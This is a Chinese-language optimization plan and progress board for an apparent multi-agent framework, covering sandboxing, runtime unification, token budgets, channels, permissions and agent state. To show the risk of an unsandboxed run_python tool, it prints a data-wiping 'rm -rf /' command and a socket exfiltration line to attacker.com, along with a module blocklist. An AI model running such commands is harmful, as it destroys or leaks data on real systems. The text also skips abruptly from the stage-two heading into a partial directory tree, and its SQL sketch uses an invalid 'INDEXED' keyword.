# AgentsGroup2026 — Agent 体系优化规划 (OptimizePlan)

> 文档版本: v1.0
> 创建日期: 2026-05-29
> 适用范围: `src/backend/agents/` 全模块及相关运行时

---

## 📌 总览

### 现状诊断（一句话总结）

> 这个项目有**漂亮的数据结构、宏大的设计愿景**，但很多核心机制停留在"有定义无实现"的状态——`channels` 没消费者、`permissions` 不生效、两套互不兼容的 AgentLoop、`run_python` 零隔离、Plaza 讨论靠硬编码轮数收尾。

### 优化总目标

让项目从"**会跑的 Demo**"进化成"**真正多 Agent 自主协作、可观测、可控成本的生产级框架**"。

### 核心原则

1. **先补漏，再扩能** — 已有设计但没实现的优先补齐，不急着加新概念
2. **统一胜过完美** — 两套半吊子的代码不如一套能用的
3. **可观测先行** — 看不见就治不好
4. **沙箱不可妥协** — `run_python` 不隔离的项目不能上生产

---

## 🗂 项目执行看板（2026-05-29）

> 说明：从这一版开始，这份文档同时承担两件事：
> 1. 前半部分是**可执行看板**
> 2. 后半部分保留**详细优化方案**

### 状态图例

- `DONE`：已完成并验证
- `WIP`：进行中
- `READY`：已明确，下一批可直接开工
- `BACKLOG`：已收敛问题，但暂未排进当前批次

### 阶段判断（2026-05-30）

- 当前仍处于 **阶段一：止血**
- **P0 必须项尚未全部完成**
- 已完成的 P0/高风险项：
  - `#12 API Key 明文存储`
  - `#14 token 配额 / 成本告警` 的后端主链
  - `#3 permissions`（虽属阶段二，但已前置完成）
- 尚未出关的 P0 卡点：
  - `#11 run_python / run_pytest` 仍缺 Docker 级强隔离
  - `#4 统一 AgentLoop` 的工具流与计划流已并入 runtime，但 tracing / state / 事件模型仍未完全统一
  - `#14 token 配额 / 成本告警` 仍缺前端仪表盘、更精细成本模型与长回路验证

### 已完成铺垫（已落地）

这些工作已经不是“规划”，而是当前仓库里的已完成基础设施：

| 卡片 | 状态 | 已完成内容 | 验证 |
|------|:----:|------------|------|
| F-01 | DONE | 默认测试入口已覆盖后端核心测试 | `python3 -m pytest -q src/backend/tests --maxfail=1` |
| F-02 | DONE | Plaza 计划已可结构化派发到真实 Task 提交链 | Plaza 派发回归测试通过 |
| F-03 | DONE | Evolution 去掉 `DISPATCHED -> VERIFY_PENDING` 假闭环 | `test_plaza_evolution_bridge.py` |
| F-04 | DONE | Agent / Skill 绑定已支持持久化、运行时解析、required_tools 注入 | `test_agent_skill_binding.py` |
| F-05 | DONE | Task 执行产物已回写到 task metadata，并同步到 EvolutionItem | `test_plaza_task_artifact_bridge.py` |
| F-06 | DONE | `permissions` 已接入 LLM 工具暴露、AgentLoop 和 ToolExecutor 真正执行入口 | `test_permissions_and_secrets.py` |
| F-07 | DONE | token usage 已落到 SQLite，预算守卫已接入 ChatHarness，并开放 summary / alerts / budget API | `test_token_budget.py` |
| F-08 | DONE | 本地 secrets 已改为 Fernet 密文存储，支持旧明文 `.api_keys.json` 自动迁移 | `test_permissions_and_secrets.py` |
| F-09 | DONE | 共享 runtime 已同时覆盖 legacy tool loop 与 `/agent-loop` 的计划流（含流式） | `test_unified_tool_loop.py`, `test_plan_loop_runtime.py` |
| F-10 | DONE | Plaza / Evolution 任务收口已补可审阅 diff 证据（`diff_by_file` / `patch_preview`） | `test_plaza_task_artifact_bridge.py` |
| F-11 | DONE | Plaza 派生且已带通过测试结果的演进项会自动 verify / close；显式 verify test 仍保持待验证 | `test_plaza_task_artifact_bridge.py` |
| F-12 | DONE | `trace_context` 已贯穿 Plaza 派发、任务终态产物和 Evolution 同步，并显式回写 `evolution_item_ids` | `test_plaza_dispatch.py`, `test_plaza_evolution_bridge.py`, `test_plaza_task_artifact_bridge.py` |
| F-13 | DONE | 任务已产出 `trace_summary`，并开放独立 trace 查询入口 | `test_plaza_task_artifact_bridge.py` |
| F-14 | DONE | 任务已持久化 `trace_events.jsonl`，并开放 task / discussion 两级 trace 查询入口 | `test_plaza_task_artifact_bridge.py` |
| F-15 | DONE | 共享 plan runtime 已补统一事件回调面，和共享 tool runtime 开始对齐同一套 tracing / state 口子 | `test_plan_loop_runtime.py` |
| F-16 | DONE | 显式 verify test 的等待原因已回写到演进项/trace 摘要，Plaza discussion 也已开放 verification queue | `test_plaza_evolution_bridge.py`, `test_plaza_task_artifact_bridge.py` |
| F-17 | DONE | 已开放 recent traces 聚合入口，可按 team/source 直接查看最近任务链路 | `test_plaza_task_artifact_bridge.py` |
| F-18 | DONE | 验证失败重试、人工验证等待、重试耗尽都已产出 `alert_level / next_action`，Plaza discussion 可直接查询 verification alerts | `test_plaza_evolution_bridge.py`, `test_plaza_task_artifact_bridge.py` |
| F-19 | DONE | sandbox readiness 已暴露到 `/api/v1/sandbox/runtime-status` 与主健康检查 `/api/v1/health` | `test_sandbox_security.py`, `test_main_health.py` |

### 当前工作批次（正在推进）

| 卡片 | 对应问题 | 状态 | 当前结论 | 下一步 | 完成定义 |
|------|----------|:----:|----------|--------|----------|
| W-01 | #10 执行计划是 Markdown 字符串，无法自动派发 | WIP | 已完成 `Plaza -> Task -> Execution -> Evolution` 主链，任务收口已补 `diff/patch` 证据，带通过测试结果的 Plaza 派生演进项会 auto close；显式 verify test 的等待原因、verification queue、verification alerts 也已可见 | 继续把 verify queue 的消费动作、失败升级和自动提醒收口 | Plaza 讨论可产出任务、产物、变更证据、验证状态，且全链路可追踪 |
| W-02 | #13 缺少可观测性和 tracing | WIP | `trace_context`、`trace_summary`、`trace_events.jsonl` 已贯穿 Plaza → Task → Execution Artifacts → Evolution，并开放 task / discussion / recent traces 三级查询入口 | 继续补统一结构化日志出口和更广的跨任务检索 | 一次任务能按单 ID 串起讨论、执行、验证、关闭 |
| W-03 | #11 `run_python` / `run_pytest` 无沙箱隔离 | WIP | `LiteSandbox` 已落地，共享给 `agent_toolbox` 和 `tool_executor`；`DockerSandbox` 现已带 repo 内 Dockerfile、build 脚本、缺镜像失败关闭、更硬的容器限制，并可通过 runtime status / health 直接查看 readiness | 补 docker mode 真实集成验证、镜像发布链路和更强资源控制 | 从“开发期可用轻量沙箱”升级到“生产可用强隔离沙箱” |
| W-04 | #4 两套 AgentLoop 并存 | WIP | 已新增 `src/backend/agents/runtime/`，共享工具循环与共享计划循环都已落地；旧 `AgentLoop`、API tool loop、EvolutionExecutor、`/agent-loop` 已开始复用，plan runtime 也已补统一事件回调面 | 继续统一 tracing / budget / state 事件模型，并收缩 compatibility shim | 所有 agent 执行入口复用同一 runtime，兼容层仅保留薄封装 |

### 下一批（按优先级执行）

| 卡片 | 对应问题 | 状态 | 为什么现在做 | 直接交付物 | 验证口 |
|------|----------|:----:|--------------|------------|--------|
| N-02 | #12 API Key 明文存储 | DONE | env-first + gitignored secret store + Fernet 加密落地；旧明文 store 自动迁移 | 后续可补 key 轮换和系统钥匙串托管 | 仓库与配置快照中不再出现明文 key，且本地 secrets 已加密存储 |
| N-03 | #4 两套 AgentLoop 并存 | WIP | 共享工具循环 + 共享计划循环都已落地，旧入口已开始回收，plan runtime 也已对齐统一事件回调 | 继续把 tracing、状态机事件、streaming 明细收口到同一个 runtime | 旧入口迁移后测试保持通过 |
| N-04 | #14 无 token 配额和成本告警 | WIP | SQLite usage log、预算守卫、summary / alerts / budget API 已落地；非流式与流式主链都已接入记录/拦截 | 补前端仪表盘、更精细成本模型与长回路验证 | 长任务超预算时可中止或告警，且用量可查询可告警 |

### 待排期（问题已确认）

| 编号 | 问题 | 状态 | 备注 |
|------|------|:----:|------|
| #1 | 事件总线是进程内实现，无法横向扩展 | BACKLOG | 等当前单机闭环稳定后，再考虑外部 MQ |
| #2 | `channels` 有定义但没有真正消费者 | BACKLOG | 建议放在统一 runtime 后补 |
| #5 | UltraPlan 仍是硬编码 if/else | BACKLOG | 先把执行闭环做硬，再升级 planner |
| #6 | Hermes 概率工具集没有反馈学习 | BACKLOG | 依赖预算系统和效果反馈数据 |
| #7 | 会话持久化仍是 JSON 全量扫描 | BACKLOG | 可与 tracing / telemetry 一起做存储升级 |
| #8 | `state` 字段没有状态机、超时和变更事件 | BACKLOG | 适合在 unified runtime 落地时一并收口 |
| #9 | Plaza 讨论仍偏轮播，不是真正辩论协商 | BACKLOG | 当前先保执行闭环，后做共识度量和动态退出 |

### 14 项主问题状态总表

| # | 主题 | 当前状态 | 备注 |
|---|------|:--------:|------|
| 1 | 事件总线外部化 | BACKLOG | 未开工 |
| 2 | `channels` 真正消费 | BACKLOG | 未开工 |
| 3 | `permissions` 接进工具调用 | DONE | Tool schema、AgentLoop、ToolExecutor 已接入 |
| 4 | 统一 AgentLoop | WIP | 共享工具循环 + 共享计划循环已落地，legacy tool loop / evolution / `/agent-loop` 已迁入 |
| 5 | UltraPlan 真正规划化 | BACKLOG | 未开工 |
| 6 | Hermes 反馈学习 | BACKLOG | 未开工 |
| 7 | 会话存储升级 | BACKLOG | 未开工 |
| 8 | `state` 状态机治理 | BACKLOG | 未开工 |
| 9 | Plaza 共识 / 动态退出 | BACKLOG | 未开工 |
| 10 | Plaza 计划自动派发 | WIP | 主链已通，变更证据、auto close、manual verify queue、verification alerts 都已沉淀，重试消费闭环待补 |
| 11 | `run_python` / `run_pytest` 沙箱化 | WIP | LiteSandbox + DockerSandbox 已落地，repo 内镜像来源/build 脚本/runtime readiness 已补，实机验证与发布链待补 |
| 12 | API Key 脱离明文 JSON | DONE | env-first + 加密 at rest + 自动迁移已落地 |
| 13 | 结构化日志 / tracing | WIP | `trace_context`、`trace_summary`、`trace_events.jsonl` 与 task / discussion / recent traces 查询入口已落地，统一结构化日志出口待补 |
| 14 | token 配额 / 成本告警 | WIP | 主链预算守卫已落地，前端与流式补完待续 |

### 当前建议执行顺序

1. 完成 `W-03` 的 Docker 级隔离收口
2. 继续 `W-04 / N-03`，收口 runtime 的 tracing / state / event 模型
3. 回到 `W-01`，把 verify queue 的消费动作、失败升级和自动提醒收口
4. 推进 `W-02`，补统一结构化日志出口与更广的跨任务检索
5. 给 `N-04` 补前端仪表盘、更精细成本模型与长回路验证

### 当前验收快照

- 后端测试：`603 passed`
- 前端构建：`npm run build` 通过
- Plaza 主链：讨论 -> 任务 -> 产物 -> Evolution 同步已打通
- Agent / Skill：绑定、持久化、运行时注入已打通
- Permissions：未授权工具不会进入 LLM schema，也会在执行入口被稳定拒绝
- Secrets：默认 provider 与 model pool 已改为 env-first；本地 `.api_keys.json` 已切为 Fernet 密文并完成旧明文迁移
- Budget：token usage 已写入 SQLite，超预算请求会被优雅拦截，并可通过 `/usage/*` API 查询
- Streaming Budget：`stream_chat` 已在结束时写入 usage，provider 无 usage 时会回退到估算值
- 沙箱：`run_python / run_pytest` 已接入 `LiteSandbox`，`docker` 模式入口与失败关闭语义已落地，并有安全回归测试
- Unified Runtime：共享工具循环 + 共享计划循环都已落地，legacy `AgentLoop`、API tool loop、EvolutionExecutor、`/agent-loop` 已开始复用同一 runtime
- Diff Evidence：任务终态已补 `diff_by_file` 与 `patch_preview`，Plaza / Evolution 链路可直接看到变更证据
- Auto Close：Plaza 派生且已通过真实测试的演进项会自动 verify / close；显式 verify test 仍按待验证处理
- Trace Context：`discussion_id / plan_revision / task_id / evolution_item_ids` 已能跨 Plaza、Task、Evolution 传递与回写
- Trace Summary：任务会落 `trace_summary.json`，并可通过 task trace API 直接查询关联上下文
- Trace Events：任务会落 `trace_events.jsonl`，并支持 task / discussion 两级 trace 查询
- Recent Traces：已开放 recent traces 聚合入口，可按 team/source 查看最近链路
- Docker Sandbox：仓库已带 `docker/sandbox/Dockerfile` 与 `scripts/build_sandbox_image.sh`，docker mode 缺镜像会失败关闭
- Verification Queue：显式 verify test 会回写等待原因，Plaza discussion 可直接查询关联 verification queue
- Verification Alerts：人工验证等待、重试回退、重试耗尽都会产出 `alert_level / next_action`
- Sandbox Readiness：主健康检查和 sandbox runtime status 都会直接报告 docker/image readiness

---

## 🎯 现存问题清单（共 14 项）

### 一、架构层硬伤

| # | 问题 | 严重度 |
|---|------|:------:|
| 1 | 进程内事件总线，无法横向扩展，进程崩溃即丢消息 | 🔴 高 |
| 2 | `channels` 字段有定义，但实际**无任何代码消费** | 🔴 高 |
| 3 | `permissions` 两层皮——精细模型未接入工具调用 | 🔴 高 |

### 二、执行引擎缺陷

| # | 问题 | 严重度 |
|---|------|:------:|
| 4 | 两套互不兼容的 AgentLoop（同步/异步），维护双倍成本 | 🔴 高 |
| 5 | UltraPlan 是硬编码 if/else，不是真正的规划器 | 🟡 中 |
| 6 | Hermes 概率工具集是静态的，没有反馈学习 | 🟡 中 |

### 三、记忆与状态管理

| # | 问题 | 严重度 |
|---|------|:------:|
| 7 | 会话持久化用 JSON 文件，全量扫描，无索引 | 🟡 中 |
| 8 | `state` 字段无状态机管理、无超时、无变更事件 | 🟡 中 |

### 四、协作编排短板

| # | 问题 | 严重度 |
|---|------|:------:|
| 9 | Plaza 讨论是"轮播"不是"辩论"——无共识度量、无动态退出 | 🟡 中 |
| 10 | 执行计划是 Markdown 字符串，无法自动派发 | 🟡 中 |

### 五、安全与可靠性

| # | 问题 | 严重度 |
|---|------|:------:|
| 11 | `run_python`/`run_pytest` 无沙箱隔离，可任意执行系统命令 | 🔴 致命 |
| 12 | API Key 在 JSON 文件中明文存储 | 🔴 高 |

### 六、可观测性与成本

| # | 问题 | 严重度 |
|---|------|:------:|
| 13 | 缺乏结构化日志和 tracing，无法追踪一次请求全链路 | 🟡 中 |
| 14 | 无 token 配额和成本告警，Hermes 90 轮可烧几十美元 | 🔴 高 |

---

## 📋 四阶段 TODO 看板

### 阶段总览

- **阶段一：止血**：先把安全、统一执行引擎、成本守门员做硬
- **阶段二：补漏**：把现有设计里“有模型没执行”的部分真正接起来
- **阶段三：增智**：把规划、共识、反馈学习从规则驱动推进到更智能的闭环
- **阶段四：稳态**：把 tracing、持久化、多实例和密钥治理推到生产可用级别

---

## 🩹 阶段一：止血 — P0 必须先做

> 目标：消除安全风险 + 统一执行引擎 + 控制成本

### 1.1 沙箱化 `run_python` / `run_pytest`

**问题编号：** #11
**优先级：** 🔴 P0 致命
#### 当前风险

```python
# agent_toolbox.py - 当前实现
def tool_run_python(code: str, timeout=30):
    subprocess.run([py, "-c", code], cwd=..., timeout=timeout)
```

Agent 生成的代码在主进程同权限下执行，唯一防护是 timeout。理论上可以：

```python
# 灾难场景
import os
os.system("rm -rf /")
# 或
import socket
s = socket.socket()
s.connect(("attacker.com", 443))  # 数据外泄
```

#### 实施方案

**推荐方案（生产级）：Docker Exec**

```python
# src/backend/sandbox/python_runner.py

class DockerSandbox:
    """一次性 Docker 容器执行 Python 代码."""

    IMAGE = "agentsgroup-sandbox:python3.11"
    DEFAULT_LIMITS = {
        "memory": "256m",
        "cpus": "0.5",
        "network": "none",        # 默认无网络
        "read_only": True,
        "pids_limit": 50,
    }

    async def run(self, code: str, timeout: int = 30,
                  allow_network: bool = False) -> SandboxResult:
        container_name = f"sbx-{uuid4().hex[:8]}"
        cmd = [
            "docker", "run", "--rm",
            "--name", container_name,
            "--memory", self.DEFAULT_LIMITS["memory"],
            "--cpus", self.DEFAULT_LIMITS["cpus"],
            "--read-only",
            "--tmpfs", "/tmp:size=64m",
            "--network", "bridge" if allow_network else "none",
            "--pids-limit", "50",
            "-i",
            self.IMAGE,
            "python3", "-c", code,
        ]
        # ... 执行 + 超时 + 收集 stdout/stderr
```

**轻量方案（开发期）：subprocess + 资源限制**

```python
# src/backend/sandbox/python_runner_lite.py

class LiteSandbox:
    """基于 resource 模块 + 子进程隔离."""

    def run(self, code: str, timeout: int = 30) -> SandboxResult:
        # 用 resource.setrlimit 限制内存、CPU、文件大小
        # 用 PYTHONPATH 隔离允许导入的模块
        # 禁用 os/subprocess/socket（AST 检查）
        ast_tree = ast.parse(code)
        for node in ast.walk(ast_tree):
            if isinstance(node, ast.Import):
                for n in node.names:
                    if n.name in BLOCKED_MODULES:
                        raise PermissionError(f"Module {n.name} blocked")
        # ...
```

#### 集成步骤

1. 在 `src/backend/sandbox/` 下新增 `python_runner.py` + `python_runner_lite.py`
2. 修改 `agent_toolbox.py`：
   ```python
   def tool_run_python(code: str, timeout: int = 30):
       sandbox = get_sandbox()  # 单例
       result = sandbox.run(code, timeout=timeout)
       return result.to_dict()
   ```
3. 配置切换：`config/settings.json` 增加 `sandbox.mode: "docker" | "lite"`

#### 验收标准

- [ ] 测试用例 `tests/test_sandbox_security.py`：
  - Agent 执行 `os.system("touch /tmp/canary")` 必须失败
  - Agent 执行 `socket.connect()` 在 `allow_network=False` 时必须失败
  - Agent 执行 `while True: pass` 必须在 timeout 内被 kill
  - Agent 执行 `import malicious_module` 必须被 AST 检查拦截
- [ ] 现有 `run_python` 测试用例（合法代码）零修改通过
- [ ] 性能基准：合法代码执行延迟增加 < 200ms

---

### 1.2 统一两套 AgentLoop

**问题编号：** #4
**优先级：** 🔴 P0
#### 当前重复代码

| 文件 | 风格 | 用途 |
|------|------|------|
| `agent_loop.py` 的 `AgentLoop` | 同步 `http.client` | 代码生成任务 |
| `chat_harness.py` 的 `ChatHarness.agent_loop()` | 异步 `aiohttp` | 通用对话 |

两者不共享：
- HTTP 客户端实现
- 工具调用分发逻辑
- 错误重试策略
- 上下文压缩逻辑

#### 实施方案

**新目录结构：**

```
src/backend/agents/runtime/
├── __init__.py
├── loop.py              # 唯一的 AgentLoop（异步）
├── safeguards.py        # nudge / compact / partial-success
├── llm_client.py        # 从 chat_harness 拆出的 LLMClient
├── tool_dispatch.py     # 统一工具分发
└── result_models.py     # AgentLoopResult, TurnResult 等
```

**核心 `loop.py` 骨架：**

```python
class UnifiedAgentLoop:
    """统一的异步 Agent 执行循环.

    合并自 agent_loop.AgentLoop 和 chat_harness.ChatHarness.agent_loop().
    """

    def __init__(
        self,
        agent: AgentProfile,
        llm_client: LLMClient,
        tool_dispatcher: ToolDispatcher,
        permission_ctx: ToolPermissionContext,
        budget: TokenBudget,
        on_event: Optional[Callable] = None,
    ):
        self.agent = agent
        self.llm = llm_client
        self.dispatcher = tool_dispatcher
        self.permission = permission_ctx
        self.budget = budget
        self.on_event = on_event
        self.safeguards = SafeguardChain([
            IterationNudge(threshold=0.80),
            ContextCompactor(budget_chars=100_000),
            PartialSuccessHandler(),
            BudgetGuard(budget),
        ])

    async def run(self, prompt: str) -> AgentLoopResult:
        # 1. 构建初始消息
        # 2. 循环：safeguards.before_turn → llm.chat → 解析 tool_calls →
        #         permission.check → dispatcher.execute → safeguards.after_turn
        # 3. 检查 finish() 或 iteration cap
        # 4. 返回 AgentLoopResult
```

#### 迁移步骤

1. 拆分代码
   - 把 `chat_harness.py` 中的 `LLMClient` 单独成文件
   - 把 `agent_loop.py` 的 safeguards 提取为独立类

2. 实现 `UnifiedAgentLoop`
   - 异步骨架
   - 集成 safeguards chain

3. 改造调用方
   - `agent_team_api.py` / `bridge_chat.py` 等所有调用点改用新 Loop
   - 删除旧的 `AgentLoop` 类（保留文件作短期 deprecation shim）

4. 测试 + 文档
   - 跑全部已有 pytest，零退化
   - 更新 README 中的 Agent 执行流程图

#### 验收标准

- [ ] `pytest tests/` 全过
- [ ] 旧 `AgentLoop` 调用点全部迁移完毕（grep 验证）
- [ ] 异步执行：单次 chat 延迟降低 ≥ 30%（基于 aiohttp 的连接复用）
- [ ] 代码行数：新 runtime/ 总行数 < 旧两套之和的 70%

---

### 1.3 Token 成本守门员（TokenBudget）

**问题编号：** #14
**优先级：** 🔴 P0
#### 当前状态

```python
# chat_harness.py
self._total_tokens += usage.total_tokens  # 只是简单累加，无上限
```

Hermes 90 轮 × 每轮 4000 token = 360K token / session。
按 GPT-4 价格约 $10/session，一次失控循环可烧几十美元。

#### 实施方案

**数据模型：**

```python
# src/backend/agents/budget/budget_models.py

@dataclass
class TokenBudget:
    per_session_max: int = 200_000          # 单次会话上限
    per_agent_daily_max: int = 2_000_000    # Agent 每日上限
    per_team_daily_max: int = 10_000_000    # 团队每日上限
    on_exceed: str = "halt"                  # halt / warn / throttle

@dataclass
class UsageRecord:
    timestamp: float
    session_id: str
    agent_id: str
    team_id: str
    input_tokens: int
    output_tokens: int
    model: str
    cost_usd: float = 0.0
```

**存储：SQLite (`storage/usage.db`)**

```sql
CREATE TABLE usage_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp REAL NOT NULL,
    session_id TEXT,
    agent_id TEXT INDEXED,
    team_id TEXT INDEXED,
    input_tokens INTEGER,
    output_tokens INTEGER,
    total_tokens INTEGER,
    model TEXT,
    cost_usd REAL,
    date TEXT INDEXED  -- 'YYYY-MM-DD' 用于快速聚合
);

CREATE INDEX idx_agent_date ON usage_log(agent_id, date);
CREATE INDEX idx_team_date ON usage_log(team_id, date);
```

**预算检查器：**

```python
class BudgetGuard:
    def __init__(self, budget: TokenBudget, store: UsageStore):
        self.budget = budget
        self.store = store

    async def check_or_raise(
        self, session_id: str, agent_id: str, team_id: str,
        estimated_tokens: int,
    ) -> None:
        # 1. 查 session 当前累积
        session_used = self.store.get_session_total(session_id)
        if session_used + estimated_tokens > self.budget.per_session_max:
            raise BudgetExceededError(
                f"Session budget exceeded: {session_used + estimated_tokens} > "
                f"{self.budget.per_session_max}"
            )
        # 2. 查 agent 当日累积
        # 3. 查 team 当日累积
        # 超限处理：halt / warn(继续但记录) / throttle(降级到便宜模型)
```

**集成点：**

- `LLMClient.chat_completion()` 调用前调 `budget_guard.check_or_raise()`
- 调用后调 `budget_guard.record(usage)` 写入 SQLite
- `AgentLoop` 捕获 `BudgetExceededError` 后优雅终止：调用 `finish()` 工具，返回 partial result

**新 API endpoint：**

```
GET /api/usage/summary?agent_id=&team_id=&from=&to=
GET /api/usage/alerts                    # 当前接近上限的 agent/team
POST /api/usage/budget/update            # 调整预算
```

#### 验收标准

- [ ] Mock 一个会消耗 1M token 的请求，应被拦截，写入审计记录
- [ ] 前端有用量仪表盘（可放在 `agent-team-config.html` 顶部）
- [ ] 跑一次 Hermes 90 轮迭代，token 用量精确记录
- [ ] 预算超限时 Agent 不会硬崩溃，而是 graceful degradation

---

## 🔧 阶段二：补漏
└── subscriber_runtime.py   # Agent 后台监听任务
```

**核心数据模型：**

```python
@dataclass
class AgentMessage:
    msg_id: str = field(default_factory=lambda: uuid4().hex)
    channel: str = ""
    sender_agent_id: str = ""
    msg_type: str = "broadcast"  # broadcast / task_assigned / status_update / query / response
    payload: Dict[str, Any] = field(default_factory=dict)
    created_at: float = field(default_factory=time.time)
    reply_to: Optional[str] = None
    correlation_id: Optional[str] = None  # 用于追踪请求-响应链
```

**ChannelBus 实现：**

```python
class ChannelBus:
    """Agent-to-Agent 消息总线.

    设计：
    - 每个 channel 一个 asyncio.Queue
    - 同时写入 SQLite WAL 表做持久化
    - 订阅者按 priority 排序
    - 支持 ack 机制（可选）
    """

    def __init__(self, persistence: ChannelPersistence):
        self._channels: Dict[str, asyncio.Queue] = {}
        self._subscribers: Dict[str, List[Subscriber]] = {}  # channel → sorted by priority
        self._persistence = persistence

    async def publish(self, msg: AgentMessage) -> None:
        # 1. 写 WAL
        await self._persistence.append(msg)
        # 2. 推送到所有订阅者（按 priority）
        for sub in sorted(self._subscribers.get(msg.channel, []),
                          key=lambda s: -s.priority):
            await sub.queue.put(msg)

    async def subscribe(
        self, agent_id: str, channel: str, priority: int = 0,
    ) -> AsyncIterator[AgentMessage]:
        queue = asyncio.Queue(maxsize=100)
        sub = Subscriber(agent_id=agent_id, channel=channel,
                         priority=priority, queue=queue)
        self._subscribers.setdefault(channel, []).append(sub)
        try:
            while True:
                msg = await queue.get()
                yield msg
        finally:
            self._subscribers[channel].remove(sub)
```

**Agent 自动监听任务：**

```python
class AgentSubscriberRuntime:
    """每个 Agent 启动时根据 channels 配置开后台 listen 任务."""

    async def start_for_agent(self, agent: AgentProfile):
        for ch_cfg in agent.channels:
            if ch_cfg.subscribe:
                task = asyncio.create_task(
                    self._listen_loop(agent, ch_cfg)
                )
                self._tasks[(agent.agent_id, ch_cfg.channel)] = task

    async def _listen_loop(self, agent, ch_cfg):
        bus = get_channel_bus()
        async for msg in bus.subscribe(
            agent.agent_id, ch_cfg.channel, ch_cfg.priority
        ):
            await self._handle_message(agent, msg)

    async def _handle_message(self, agent, msg):
        # 默认行为：把消息加入 Agent 上下文，触发一次 chat
        # 可被自定义 handler 覆盖（按 msg_type 路由）
        if msg.msg_type == "task_assigned":
            await self._handle_task(agent, msg)
        elif msg.msg_type == "query":
            await self._handle_query(agent, msg)
        # ...
```

#### 集成点

- `TeamManager.add_agent()` → 同时调用 `subscriber_runtime.start_for_agent()`
- `TeamManager.remove_agent()` → 调用 `stop_for_agent()`
- 后端启动 (`main.py`) 时初始化全局 `ChannelBus` 单例
- 给 Agent 添加新工具：`publish_to_channel(channel, msg_type, payload)`

#### 验收场景

```
PM agent 发布任务 "实现用户登录"  →  publish 到 coding_bus
                                       ↓
       Developer agent 自动接收（priority=3，第二个收到）
                                       ↓
       自动触发 AgentLoop 执行任务
                                       ↓
       完成后 publish status_update 到 status_reports
                                       ↓
                  PM agent 收到状态报告
```

#### 验收标准

- [ ] 端到端测试：上述场景完整跑通
- [ ] 进程重启后未消费消息能从 WAL 恢复
- [ ] 100 条消息并发发布，无丢失
- [ ] priority 排序生效：高 priority 订阅者先收到

---

### 2.2 Permissions 实际接入工具链

**问题编号：** #3
**优先级：** 🟡 P1
#### 当前状态

`AgentPermission` 字段定义了，但工具调用时不检查 Agent 的 permissions。
唯一防护是 `agent_toolbox.py` 的全局静态白名单。

#### 实施方案

**核心组件：`PermissionResolver`**

```python
# src/backend/agents/security/permission_resolver.py

class PermissionResolver:
    """根据 Agent 的 permissions 计算 ToolPermissionContext."""

    # 资源 → 工具映射
    RESOURCE_TOOL_MAP = {
        "code":  {"write_file", "patch_file", "run_python"},
        "tests": {"run_pytest"},
        "docs":  {"write_file_doc"},  # 假设有专门的 doc 写入工具
        "web":   {"web_search", "navigate_url", "extract_content"},
        "tasks": {"task_create", "task_update", "task_close"},
    }

    def build_context(self, agent: AgentProfile) -> ToolPermissionContext:
        deny_names = set()
        deny_prefixes = []

        # 默认全 deny，按 permissions 逐项 allow
        all_tools = set().union(*self.RESOURCE_TOOL_MAP.values())
        allowed = set()

        for perm in agent.permissions:
            if perm.access_level in (AccessLevel.WRITE, AccessLevel.ADMIN):
                allowed.update(self.RESOURCE_TOOL_MAP.get(perm.resource, set()))
            elif perm.access_level == AccessLevel.READ:
                # READ 级别的资源对应只读工具
                allowed.update(self._read_only_tools(perm.resource))

        deny_names = all_tools - allowed
        return ToolPermissionContext.from_lists(deny_names=list(deny_names))
```

**集成到 AgentLoop：**

```python
class UnifiedAgentLoop:
    def __init__(self, agent, ...):
        self.permission_ctx = PermissionResolver().build_context(agent)

    async def _execute_tool(self, tool_name, args):
        if self.permission_ctx.blocks(tool_name):
            denial = PermissionDenial(
                tool_name=tool_name,
                reason=f"Agent {self.agent.agent_id} lacks permission",
            )
            self._record_denial(denial)
            return ToolResult(
                success=False,
                error=f"Permission denied: {tool_name}",
            )
        return await self.dispatcher.execute(tool_name, args)
```

**审计日志：**

新表 `permission_denials`（SQLite）：
```sql
CREATE TABLE permission_denials (
    id INTEGER PRIMARY KEY,
    timestamp REAL,
    agent_id TEXT,
    tool_name TEXT,
    reason TEXT,
    session_id TEXT
);
```

#### 验收标准

- [ ] 测试：把 Researcher 的 `code` 资源权限去掉，让它尝试 `write_file('src/foo.py')`，必须被拒绝并写入 `permission_denials` 表
- [ ] 测试：PM (`tasks` ADMIN) 可以创建任务，Developer (`tasks` 无权限) 不能
- [ ] 前端显示拒绝审计日志（agent-team-config 增加 tab）

---

### 2.3 State 状态机 + Watchdog

**问题编号：** #8
**优先级：** 🟡 P1
#### 实施方案

**状态机：**

```python
# src/backend/agents/runtime/state_machine.py

ALLOWED_TRANSITIONS: Dict[AgentState, Set[AgentState]] = {
    AgentState.IDLE:    {AgentState.WORKING, AgentState.STOPPED},
    AgentState.WORKING: {AgentState.IDLE, AgentState.PAUSED, AgentState.ERROR},
    AgentState.PAUSED:  {AgentState.WORKING, AgentState.STOPPED},
    AgentState.ERROR:   {AgentState.IDLE, AgentState.STOPPED},
    AgentState.STOPPED: set(),  # 终态
}

class AgentStateMachine:
    def __init__(self, event_bus: EventBus, store: TeamStore):
        self.event_bus = event_bus
        self.store = store

    async def transition(
        self,
        agent: AgentProfile,
        new_state: AgentState,
        reason: str = "",
    ) -> bool:
        if new_state not in ALLOWED_TRANSITIONS[agent.state]:
            raise InvalidStateTransition(
                f"Cannot transition {agent.state.value} → {new_state.value}"
            )
        old_state = agent.state
        agent.state = new_state
        self.store.persist_agent(agent)

        # 发布事件
        event = DomainEvent(
            event_type=EventType.AGENT_STATE_CHANGED,
            payload={
                "agent_id": agent.agent_id,
                "old_state": old_state.value,
                "new_state": new_state.value,
                "reason": reason,
            },
        )
        await self.event_bus.apublish(event)
        return True
```

**Watchdog：**

```python
class AgentWatchdog:
    """后台任务：检测异常状态."""

    DEFAULT_MAX_WORKING_TIME = 1800  # 30 min
    CHECK_INTERVAL = 30  # 30s

    async def run(self):
        while True:
            await asyncio.sleep(self.CHECK_INTERVAL)
            await self._check_all_agents()

    async def _check_all_agents(self):
        for team in self.team_manager.list_teams():
            for agent in team.agents.values():
                if agent.state == AgentState.WORKING:
                    elapsed = time.time() - agent.metadata.get("working_since", time.time())
                    if elapsed > self.DEFAULT_MAX_WORKING_TIME:
                        await self.state_machine.transition(
                            agent, AgentState.ERROR,
                            reason=f"Watchdog timeout after {elapsed}s",
                        )
                        logger.error(f"⚠️ Agent {agent.agent_id} watchdog killed")
```

**SSE 事件流（前端订阅）：**

```python
# api/agent_state_sse.py

@router.get("/api/agents/state-stream")
async def state_stream():
    queue = event_bus.subscribe_local(EventType.AGENT_STATE_CHANGED)
    async def gen():
        async for event in queue:
            yield f"data: {json.dumps(event.payload)}\n\n"
